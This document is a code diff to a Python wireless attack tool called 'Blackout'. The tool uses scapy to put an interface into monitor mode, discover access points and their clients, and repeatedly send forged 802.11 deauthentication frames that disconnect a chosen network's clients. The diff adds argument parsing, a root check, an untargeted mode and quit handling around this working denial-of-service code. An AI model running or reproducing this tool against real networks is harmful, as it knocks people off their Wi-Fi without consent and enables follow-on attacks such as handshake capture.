@@ -38,14 +38,17 @@ class INFO:
 
 class Blackout:
 
-    def __init__(self, interface):
+    def __init__(self, args):
+
+        self.args = args
 
         # Set curses screen object
-        self.screen, self.window = Blackout.start_curses()
+        self.screen, self.window = start_curses()
 
         # Set scapy sniff interface
-        conf.iface = interface
-        self.iface = interface
+        conf.iface = args.interface
+        self.iface = args.interface
+        self.monitor_mode = False
 
         # Compile list of vendors
         self.vendors = compile_vendors()
@@ -57,13 +60,12 @@ class Blackout:
 
         self.main_display = TriggerList(self.update_display)
         self.target_ap = dict()
-        # self.target_bssid = None
         self.target_client = None
         self.target_id = None
 
         self.thread_channel_hop = Thread(
             target=self.channel_hop,
-            args=(str(interface),))
+            args=(str(self.iface),))
         self.thread_channel_hop.daemon = True
 
         # Stop channel hopper when cleared
@@ -116,7 +118,12 @@ class Blackout:
             user_input = chr(user_input)
 
             if user_input == 'q':
-                self.exit_application(thread=True)
+                self.client_update_event.clear()
+                self.deauth_active = False
+                sleep(1)
+                stop_mon(self.iface)
+                self.monitor_mode = False
+                break
 
             if user_input == 's':
                 if self.deauth_active:
@@ -158,9 +165,8 @@ class Blackout:
         self.output(f"[+] Stopping any interfering processes...\n")
 
         try:
-            status = start_mon(self.iface)
-            if status is False:
-                raise Exception(f"[!!] Could not put {self.iface} into MONITOR mode")
+            start_mon(self.iface)
+            self.monitor_mode = True
         except Exception as e:
             self.error(e)
 
@@ -197,6 +203,7 @@ class Blackout:
         # Wait for user to end client sniffing phase
         # TODO: This seems very inelegant, fix this
         while self.ap_update_event.is_set():
+            self.check_exit()
             pass
 
         sleep(2)
@@ -210,10 +217,14 @@ class Blackout:
         else:
             self.output(f"Access Points discovered: {len(self.ap_dict)}\n\n")
 
+        if not self.args.targeted:
+            self.output("Press 'q' to quit\n")
+
     def deauth_menu_choice(self):
         self.output(choice_string())
         self.choosing = True
         while self.choosing and self.choice is None:
+            self.check_exit()
             pass
 
     def start_deauth(self):
@@ -234,11 +245,14 @@ class Blackout:
     def select_target(self, client=False):
         self.target_id = None
         self.output(horizontal_rule(30))
-        self.output(f"\n[?] Enter ID of the {'client' if client else 'AP'} you wish to target: ")
+        self.output(f"\n[*] Press 'q' to quit.\n")
+        self.output(f"[?] Enter ID of the {'client' if client else 'AP'} you wish to target: ")
 
         # TODO: There may be a better way
         # Waiting for user input
         while self.target_id is None:
+            # Check if 'q' has been pressed to quit
+            self.check_exit()
             pass
 
         self.output(str(self.target_id))
@@ -276,24 +290,30 @@ class Blackout:
             self.interface_setup()
             self.start_threads()
             self.start_sniff()
-            self.select_target()
-            self.start_deauth()
+            if self.args.targeted:
+                self.select_target()
+                self.start_deauth()
+            else:
+                while True:
+                    self.check_exit()
 
         except Exception as e:
-            log_error_to_file(traceback.format_exc())
             self.error(e)
 
         except KeyboardInterrupt:
             pass
 
         finally:
-            self.main_display.append("[!] Exiting...\n")
-            sleep(2)
+            self.exit_application()
 
     def deauth(self, deauth_all=True):
         """
         create deauth packets and send them to the target AP
         """
+        # Stop adding APs/Clients to ap_dict
+        self.client_update_event.clear()
+        sleep(2)
+
         self.deauth_active = True
         channel = str(self.ap_dict[self.target_ap]['channel'])
 
@@ -323,23 +343,22 @@ class Blackout:
 
                 packets.append(deauth_to_bcast)
 
-                with self.lock:
-                    for client in self.ap_dict[self.target_ap]['clients']:
-                        deauth_to = Dot11(
-                            type=0,
-                            subtype=12,
-                            addr1=client,
-                            addr2=self.target_ap,
-                            addr3=self.target_ap)/Dot11Deauth()
+                for client in self.ap_dict[self.target_ap]['clients']:
+                    deauth_to = Dot11(
+                        type=0,
+                        subtype=12,
+                        addr1=client,
+                        addr2=self.target_ap,
+                        addr3=self.target_ap)/Dot11Deauth()
 
-                        deauth_from = Dot11(
-                            type=0,
-                            subtype=12,
-                            addr1=self.target_ap,
-                            addr2=client,
-                            addr3=client)/Dot11Deauth()
+                    deauth_from = Dot11(
+                        type=0,
+                        subtype=12,
+                        addr1=self.target_ap,
+                        addr2=client,
+                        addr3=client)/Dot11Deauth()
 
-                        packets.extend([deauth_to, deauth_from])
+                    packets.extend([deauth_to, deauth_from])
 
             else:
                 deauth_to_client = Dot11(
@@ -369,22 +388,24 @@ class Blackout:
                 while self.deauth_active:
                     self.output(".")
                     for pkt in packets:
+                        if not self.deauth_active:
+                            break
                         sendp(pkt, inter=0.1, count=1, iface=conf.iface)
 
             except KeyboardInterrupt:
                 pass
 
             except Exception as e:
-                self.error(e)
-                self.exit_application()
-                sys.exit(0)
+                pass
+                #self.error(e)
+                #self.exit_application()
+                #sys.exit(0)
 
             self.output("[*] Deauthentication Complete\n")
             return
 
         except Exception as e:
             self.error(e)
-            log_error_to_file(traceback.format_exc())
 
     def sniff_access_points(self, pkt):
         """
@@ -403,6 +424,8 @@ class Blackout:
                         access_point = pkt.addr3.upper()
                         # Add Access-Point to ap_dict
                         self.add_access_point(access_point, pkt)
+        else:
+            sys.exit(0)
 
     def sniff_clients(self, pkt):
         if self.client_update_event.is_set():
@@ -419,6 +442,8 @@ class Blackout:
                             self.add_client(src, dst)
                         elif dst in self.ap_dict and not self.is_client(dst, src):
                             self.add_client(dst, src)
+        else:
+            sys.exit(0)
 
     def is_client(self, ap, client):
         return client in self.ap_dict[ap]['clients']
@@ -447,7 +472,6 @@ class Blackout:
             if "ord" in f"{e}":  # TODO This may be to do with 5GHz channels cropping up?
                 pass
             else:
-                log_error_to_file(traceback.format_exc())
                 self.error(e)
 
     def add_client(self, access_point, new_client):
@@ -533,10 +557,10 @@ class Blackout:
                             break
                         p.communicate()
                         sleep(1)  # TODO -- Experiment with different values
-                    except KeyboardInterrupt:
-                        break
-                    except Exception:
-                        pass
+                    except Exception as e:
+                        self.error(e)
+            else:
+                break
 
     def exit_curses(self):
         # End curses
@@ -545,22 +569,21 @@ class Blackout:
         curses.echo()
         curses.endwin()
 
-    def exit_application(self, thread=False):
+    def check_exit(self):
+        if not self.input_thread.is_alive():
+            sleep(2)
+            #self.exit_application()
+            raise Exception("[!] Exiting...")
 
-        self.to_window(f"[!!] Putting {self.iface} back into MANAGED mode...")
-
+    def exit_application(self):
         try:
-            status = stop_mon(self.iface)
-            if not status:
-                raise Exception("[!] Error putting {self.iface} into MANAGED mode")
-
+            #self.output(f"\n[!!] Putting {self.iface} back into MANAGED mode...\n")
+            if self.monitor_mode is not False:
+                stop_mon(self.iface)
             self.exit_curses()
-
-            if thread:
-                os.kill(os.getpid(), signal.SIGINT)
-                sys.exit(0)
-            else:
-                sys.exit(0)
+            sleep(1)
+            #Popen(['reset']).communicate()
+            sys.exit(0)
 
         except Exception as e:
             self.error(e)
@@ -577,45 +600,58 @@ class Blackout:
     def error(self, error):
         self.output(f"[!] Error: {error}\n")
         log_error_to_file(traceback.format_exc())
+        sys.exit(0)
 
     def output(self, msg):
         self.main_display.append(msg)
 
-    @staticmethod
-    def start_curses():
-        # Setup curses
-        screen = curses.initscr()
-        curses.noecho()
-        curses.cbreak()
-        curses.curs_set(0)
-        screen.keypad(True)
-
-        # Use all the colours!
-        # https://stackoverflow.com/questions/18551558/how-to-use-terminal-color-palette-with-curses
-        curses.start_color()
-        curses.use_default_colors()
-        for i in range(0, curses.COLORS):
-            curses.init_pair(i + 1, i, -1)
-
-        HEIGHT, WIDTH = screen.getmaxyx()
-
-        window = curses.newwin(HEIGHT - 2, WIDTH - 2, 1, 1)
-        # window.border('|', '|', '-', '-', '+', '+', '+', '+')
-
-        screen.noutrefresh()
-        window.noutrefresh()
-        curses.doupdate()
-
-        return screen, window
+    # @staticmethod
+    # def start_curses():
+    #     # Setup curses
+    #     screen = curses.initscr()
+    #     curses.noecho()
+    #     curses.cbreak()
+    #     curses.curs_set(0)
+    #     screen.keypad(True)
+    #
+    #     # Use all the colours!
+    #     # https://stackoverflow.com/questions/18551558/how-to-use-terminal-color-palette-with-curses
+    #     curses.start_color()
+    #     curses.use_default_colors()
+    #     for i in range(0, curses.COLORS):
+    #         curses.init_pair(i + 1, i, -1)
+    #
+    #     HEIGHT, WIDTH = screen.getmaxyx()
+    #
+    #     window = curses.newwin(HEIGHT - 2, WIDTH - 2, 1, 1)
+    #     # window.border('|', '|', '-', '-', '+', '+', '+', '+')
+    #
+    #     screen.noutrefresh()
+    #     window.noutrefresh()
+    #     curses.doupdate()
+    #
+    #     return screen, window
 
 
 if __name__ == "__main__":
+
+    if os.geteuid() != 0:
+        print("[!] Must be run as root")
+        sys.exit(0)
+
+    # Get arguments
+    args = parse_args()
+
+    if args.interface:
+        iface = args.interface
+    else:
+        iface = get_wlan_interface()
 
     # Clear log file
     with open('log', 'w') as f:
         f.write('')
 
-    blackout = Blackout("wlan0")
+    blackout = Blackout(args)
 
     # Set the signal handler
     signal.signal(signal.SIGINT, blackout.signal_handler)
